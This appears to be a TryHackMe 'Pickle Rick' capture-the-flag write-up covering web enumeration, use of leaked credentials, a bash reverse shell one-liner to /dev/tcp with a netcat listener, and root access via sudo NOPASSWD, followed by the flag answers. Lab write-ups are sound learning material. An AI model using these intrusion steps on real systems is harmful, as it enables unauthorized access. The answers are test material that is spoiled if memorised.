## Pickle Rick - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/picklerick)

<i>This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

Deploy the virtual machine on this task and explore the web application: MACHINE_IP</i>

**IP: 10.10.236.115**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Gobuster, Nikto<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20CUT.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Let's start with Nmap, Gobuster and Nikto.

  ```
  nmap -sC -sV -T5 -p- 10.10.236.115

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 ab:3e:21:3f:47:cf:4a:e5:b8:c1:6a:37:b3:96:4a:29 (RSA)
  |   256 67:53:84:0b:75:97:8c:78:82:75:1a:ac:93:67:2d:fd (ECDSA)
  |_  256 14:0d:74:ad:9e:75:00:44:88:6d:26:8b:a2:b9:db:01 (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  |_http-title: Rick is sup4r cool
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.236.115/ -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.htaccess            (Status: 403) [Size: 278]
  /.hta                 (Status: 403) [Size: 278]
  /.htpasswd            (Status: 403) [Size: 278]
  /assets               (Status: 301) [Size: 315] [--> http://10.10.236.115/assets/]
  /index.html           (Status: 200) [Size: 1062]
  /robots.txt           (Status: 200) [Size: 17]
  /server-status        (Status: 403) [Size: 278]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```

  ```
  nikto -url http://10.10.236.115/

  - Nikto v2.5.0
  ---------------------------------------------------------------------------
  + Target IP:          10.10.236.115
  + Target Hostname:    10.10.236.115
  + Target Port:        80
  + Start Time:         2025-05-09 20:02:25 (GMT1)
  ---------------------------------------------------------------------------
  + Server: Apache/2.4.41 (Ubuntu)
  + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
  + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
  + No CGI Directories found (use '-C all' to force check all possible dirs)
  + Apache/2.4.41 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
  + /: Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
  + /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
  + OPTIONS: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS .
  + /login.php: Admin login page/section found.
  + 8074 requests: 0 error(s) and 7 item(s) reported on remote host
  + End Time:           2025-05-09 20:09:51 (GMT1) (446 seconds)
  ---------------------------------------------------------------------------
  + 1 host(s) tested
  ```
  
- Honestly this is the first time that `nikto` was actually usefull lol, it found login page. Beside that, in source code of main page you can find username.

  ```
    <!--

    Note to self, remember username!

    Username: R1ckRul3s

    -->
  ```
  
- In `robots.txt` I found `Wubbalubbadubdub` so I tried using that as SSH password but it didn't work. Since nikto actually did it's job for once I tried same credentials on admin login page. It worked!

---

## ⚙️ Shell Access

- Now, here comes my favourite part, REVERSE SHELLS! OK, so in admin page you have option to run commands. Unfortunately, when you use `cat` it won't work, that's a sign to upload reverse shell.

  ```
  ls 

  Sup3rS3cretPickl3Ingred.txt
  assets
  clue.txt
  denied.php
  index.html
  login.php
  portal.php
  robots.txt
  
  cat Sup3rS3cretPickl3Ingred.txt
  Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
  ```
  
- I tried php reverse shell first and it didn't work, but bash shell did. Start a listener and upload this one liner in admin panel.

  ```
  bash -c 'bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1' 

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.236.115] 50424
  bash: cannot set terminal process group (1033): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@ip-10-10-236-115:/var/www/html$ whoami
  whoami
  www-data
  ```
  
- Of course that I have to switch to my beloved putty shell, that's not even a question, let's go find those ingredients!

  ```
  python3 -c 'import pty,os,sys; pty.spawn("/bin/bash")'
  CTRL-Z
  stty raw -echo; fg
  export TERM=xterm
  ```

---

## 🧍 User Privilege Escalation

- Wellp, at first I started enumerating the machine with `find` and `grep` in order to get those files but that took soooooo long that I didn't even let it finish, so I started looking for them manually.
  
- First one is already there, just read it and second one is in `/home/rick`.

  ```
  www-data@ip-10-10-236-115:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt 
  mr. meeseek hair 
  
  www-data@ip-10-10-236-115:/var/www/html$ cat clue.txt 
  Look around the file system for the other ingredient.

  www-data@ip-10-10-236-115:/home/rick$ cat 'second ingredients' 
  1 jerry tear
  ```

---

## 👑 Root Privilege Escalation

- After finding first two ingredients I had a feeling that third one is in root directory, so I ran `sudo -l` as always and guess what I found?

  ```
  www-data@ip-10-10-236-115:/home/ubuntu$ sudo -l
  Matching Defaults entries for www-data on ip-10-10-236-115:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User www-data may run the following commands on ip-10-10-236-115:
      (ALL) NOPASSWD: ALL
  ```
  
- YEP! We can use any sudo command without password. Just switch to root and read the last ingredient.

  ```
  www-data@ip-10-10-236-115:/$ sudo su
  root@ip-10-10-236-115:/# cd /root
  root@ip-10-10-236-115:~# ls -al
  total 36
  drwx------  4 root root 4096 Jul 11  2024 .
  drwxr-xr-x 23 root root 4096 May  9 18:46 ..
  -rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
  -rw-------  1 root root  168 Jul 11  2024 .bash_history
  -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
  -rw-r--r--  1 root root  161 Jan  2  2024 .profile
  drwxr-xr-x  4 root root 4096 Jul 11  2024 snap
  drwx------  2 root root 4096 Feb 10  2019 .ssh
  -rw-------  1 root root  702 Jul 11  2024 .viminfo
  root@ip-10-10-236-115:~# cat 3rd.txt 
  3rd ingredients: fleeb juice
  ```
  
- See ya in the next one, Wubbalubbadubdub! 🥒

---

## 🏁 Flags

- **What is the first ingredient that Rick needs?**: `mr. meeseek hair`
- **What is the second ingredient in Rick’s potion?**: `1 jerry tear`
- **What is the last and final ingredient?**: `fleeb juice`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing really, I'm literally proud of nikto for doing it's job lol.`

- What did I learn?
  `To always try different things`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
